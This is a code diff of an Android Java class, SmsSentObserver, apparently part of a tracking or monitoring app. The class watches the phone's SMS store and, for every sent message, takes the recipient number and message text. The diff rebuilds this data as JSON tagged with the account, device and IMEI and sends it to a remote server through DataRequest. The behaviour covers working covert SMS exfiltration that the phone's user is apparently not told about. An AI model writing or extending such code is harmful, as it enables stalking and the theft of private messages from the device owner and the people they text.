@@ -1,9 +1,9 @@
 package com.inet.android.sms;
 
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
-import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.database.ContentObserver;
@@ -11,23 +11,22 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 import android.preference.PreferenceManager;
-import android.util.Log;
 
 import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.request.DataRequest;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
 public class SmsSentObserver extends ContentObserver {
 
-	private static final String TAG = "SMSTRACKERopa";
+	private static final String TAG = "SMSTSentObserver";
 	private static final Uri STATUS_URI = Uri.parse("content://sms");
 	String dir = null;
 	SharedPreferences sp;
 	private Context mContext;
 	RequestMakerImpl req;
 	private static long id = 0;
-	
 
 	public SmsSentObserver(Handler handler, Context ctx) {
 		super(handler);
@@ -40,7 +39,7 @@ public class SmsSentObserver extends ContentObserver {
 	}
 
 	public void onChange(boolean selfChange) {
-		dir = "исх. Sms";
+		dir = "6";
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		String sms = sp.getString("KBD", "0");
 
@@ -51,16 +50,19 @@ public class SmsSentObserver extends ContentObserver {
 
 		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
 		if (!isWork) {
-			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork), 
+			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
 					"isWork return " + Boolean.toString(isWork));
 
 			return;
 		} else {
-			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
+			Logging.doLog(TAG, Boolean.toString(isWork),
+					Boolean.toString(isWork));
 		}
 
 		try {
-			Logging.doLog(TAG, "Notification on SMS observer", "Notification on SMS observer");
+			ConvertDate date = new ConvertDate();
+			Logging.doLog(TAG, "Notification on SMS observer",
+					"Notification on SMS observer");
 
 			Cursor sms_sent_cursor = mContext.getContentResolver().query(
 					STATUS_URI, null, null, null, null);
@@ -69,14 +71,16 @@ public class SmsSentObserver extends ContentObserver {
 					String protocol = sms_sent_cursor.getString(sms_sent_cursor
 							.getColumnIndex("protocol"));
 
-					Logging.doLog(TAG, "protocol : " + protocol, "protocol : " + protocol);
+					Logging.doLog(TAG, "protocol : " + protocol, "protocol : "
+							+ protocol);
 
 					if (protocol == null) {
 						// String[] colNames = sms_sent_cursor.getColumnNames();
 						int type = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
 
-						Logging.doLog(TAG, "SMS Type : " + type, "SMS Type : " + type);
+						Logging.doLog(TAG, "SMS Type : " + type, "SMS Type : "
+								+ type);
 
 						if (type == 2) {
 							long messageId = sms_sent_cursor
@@ -94,30 +98,47 @@ public class SmsSentObserver extends ContentObserver {
 												+ threadId), null, null, null,
 										null);
 								c.moveToNext();
-								String sendStr = "<packet><id>"
-										+ sp.getString("ID", "ID")
-										+ "</id><time>"
-										+ logTime()
-										+ "</time><type>4</type><app>"
-										+ dir
-										+ "</app><ttl>"
-										+ sms_sent_cursor
-												.getString(sms_sent_cursor
-														.getColumnIndex("address"))
-										+ "</ttl><cdata1>"
-										+ sms_sent_cursor
-												.getString(sms_sent_cursor
-														.getColumnIndex("body"))
-										+ "</cdata1><ntime>" + "30"
-										+ "</ntime></packetSentObserver>";
+								String phNumber = sms_sent_cursor
+										.getString(sms_sent_cursor
+												.getColumnIndex("address"));
+								String message = sms_sent_cursor
+										.getString(sms_sent_cursor
+												.getColumnIndex("body"));
+								// -------send sms----------------------------
+								String sendJSONStr = null;
+								JSONObject jsonObject = new JSONObject();
+								JSONArray data = new JSONArray();
+								JSONObject info = new JSONObject();
+								JSONObject object = new JSONObject();
+								try {
+									jsonObject.put("account",
+											sp.getString("account", "0000"));
+									jsonObject.put("device",
+											sp.getString("device", "0000"));
+									jsonObject.put("imei",
+											sp.getString("imei", "0000"));
+									jsonObject.put("key",
+											System.currentTimeMillis());
 
-//								req = new RequestMakerImpl(mContext);
-//								req.sendDataRequest(sendStr);
-								
+									info.put("tel", phNumber);
+									info.put("data", message);
+
+									object.put("time", date.logTime());
+									object.put("type", type);
+									object.put("info", info);
+									data.put(object);
+									jsonObject.put("data", data);
+									sendJSONStr = data.toString();
+								} catch (JSONException e) {
+									Logging.doLog(TAG, "json сломался",
+											"json сломался");
+								}
+
 								DataRequest dr = new DataRequest(mContext);
-								dr.sendRequest(sendStr);
+								dr.sendRequest(sendJSONStr);
 
-								Logging.doLog(TAG, sendStr, sendStr);
+								Logging.doLog(TAG, sendJSONStr, sendJSONStr);
+								Logging.doLog(TAG, sendJSONStr);
 
 								/*
 								 * if(colNames != null){ for(int k=0;
@@ -131,21 +152,13 @@ public class SmsSentObserver extends ContentObserver {
 				}
 			} else
 
-				Logging.doLog(TAG, "smsSentObserver: Send Cursor is Empty", 
-					"smsSentObserver: Send Cursor is Empty");
+				Logging.doLog(TAG, "smsSentObserver: Send Cursor is Empty",
+						"smsSentObserver: Send Cursor is Empty");
 		} catch (Exception sggh) {
-			Logging.doLog(TAG, "Error on onChange : " + sggh.toString(), 
+			Logging.doLog(TAG, "Error on onChange : " + sggh.toString(),
 					"Error on onChange : " + sggh.toString());
 		}
 		super.onChange(selfChange);
-	}// fn onChange
-
-	@SuppressLint("SimpleDateFormat")
-	private String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-		Calendar cal = Calendar.getInstance();
-		cal.setTimeInMillis(System.currentTimeMillis());
-		return "" + formatter.format(cal.getTime());
-
 	}
+
 }// End of class SmsSentObserver
